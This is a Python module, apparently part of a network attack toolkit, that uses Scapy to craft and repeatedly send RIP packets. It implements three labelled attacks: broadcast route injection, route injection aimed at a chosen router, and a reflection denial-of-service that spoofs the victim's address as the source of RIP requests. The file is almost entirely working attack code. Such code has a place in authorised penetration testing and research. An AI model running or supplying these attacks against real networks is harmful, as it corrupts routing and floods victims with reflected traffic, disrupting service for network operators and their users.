from scapy.layers.inet import IP
from scapy.layers.l2 import Ether, Dot3
from scapy.layers.rip import *
from scapy.packet import Packet
from libs.aux_funcs import send_l3_loop, send_l2_loop, attack_cat, attack_layer, attack_type, type_wrapper


RIP_BROADCAST_IP = '224.0.0.9'
RIP_UDP_PORT = 520

@type_wrapper(name="RIP Route Injection", type=attack_type.RoutePoisoning, category=attack_cat.Attack, layer=attack_layer.L3_RIP, arg_list=[])
def RIP_route_injection(args):
    """Performs a RIP route injection attack. Utilizes imported routing information"""
    pkt = args['pkt']

    rip_info = _RIP_parse_routes(args['rip_info'])

    if pkt != None:
        if pkt.haslayer(IP):
            pkt[IP].ttl = 15
            pkt[IP].dst = RIP_BROADCAST_IP
        else:
            pkt = pkt/IP(dst=RIP_BROADCAST_IP, ttl = 15)
        pkt = pkt/UDP(sport=RIP_UDP_PORT,dport=RIP_UDP_PORT)/RIP(cmd=2,version=2)/rip_info
    else:
        pkt = IP(dst=RIP_BROADCAST_IP)/UDP(sport=RIP_UDP_PORT,dport=RIP_UDP_PORT)/RIP(cmd=2,version=2)/rip_info

    args['pkt'] = pkt
    args['interval'] = 60


    if pkt.haslayer(Ether) or pkt.haslayer(Dot3):
        send_l2_loop(args)
    else:
        send_l3_loop(args)

    pass


@type_wrapper(name="RIP Route Injection (Targeted)", type=attack_type.RoutePoisoning, category=attack_cat.Attack, layer=attack_layer.L3_RIP, arg_list=['target_ip'])
def RIP_targeted_injection(args):
    """Performs a RIP route injection attack, targeted to a specific router. Utilizes imported routing information"""
    pkt = args['pkt']
    target = args['target_ip']

    rip_info = _RIP_parse_routes(args['rip_info'])

    if pkt != None:
        if pkt.haslayer(IP):
            pkt[IP].ttl = 15
            pkt[IP].dst = target
        else:
            pkt = pkt/IP(dst=target, ttl = 15)
        pkt = pkt/UDP(sport=RIP_UDP_PORT,dport=RIP_UDP_PORT)/RIP(cmd=2,version=2)/rip_info
    else:
        pkt = IP(dst=target)/UDP(sport=RIP_UDP_PORT,dport=RIP_UDP_PORT)/RIP(cmd=2,version=2)/rip_info

    args['pkt'] = pkt
    args['interval'] = 60


    if pkt.haslayer(Ether) or pkt.haslayer(Dot3):
        send_l2_loop(args)
    else:
        send_l3_loop(args)

    pass
    

@type_wrapper(name="RIP Request DoS", type=attack_type.DoS, category=attack_cat.Attack, layer=attack_layer.L3_RIP, arg_list=['target_ip'])
def RIP_request_DoS(args):
    """Performs a DoS Reflection attack utilizing RIP requests. Requires target IP"""

    pkt = args['pkt']

    if pkt != None:
        if pkt.haslayer(IP):
            pkt[IP].ttl = 15
            pkt[IP].src = args['target_ip']
            pkt[IP].dst = RIP_BROADCAST_IP
        elif not pkt.haslayer(IP):
            pkt = pkt/IP(ttl=15, src = args['target_ip'], dst = RIP_BROADCAST_IP)

        pkt = pkt/UDP(sport=RIP_UDP_PORT, dport=RIP_UDP_PORT)/RIP(cmd=1,version=2)/RIPEntry(AF=0,metric=16)

    else:
        pkt = IP(src=args['target_ip'], dst=RIP_BROADCAST_IP, ttl=15)/UDP(sport=RIP_UDP_PORT, dport=RIP_UDP_PORT)/RIP(cmd=1,version=2)/RIPEntry(AF=0,metric=16)

    args['interval'] = 60
    args['pkt'] = pkt

    if pkt.haslayer(Ether) or pkt.haslayer(Dot3):
        send_l2_loop(args)
    else:
        send_l3_loop(args)

    return




def _RIP_parse_routes(args):
    raw_routes = args['rip']['routes']
    pkt = None

    for rr in raw_routes:
        entry = RIPEntry(AF=rr['AF'], RouteTag=rr['routeTag'], addr=rr['addr'], mask=rr['mask'], nextHop=rr['nextHop'], metric=rr['metric'])
        if pkt != None:
            pkt = pkt/entry
        else:
            pkt = entry

    return pkt
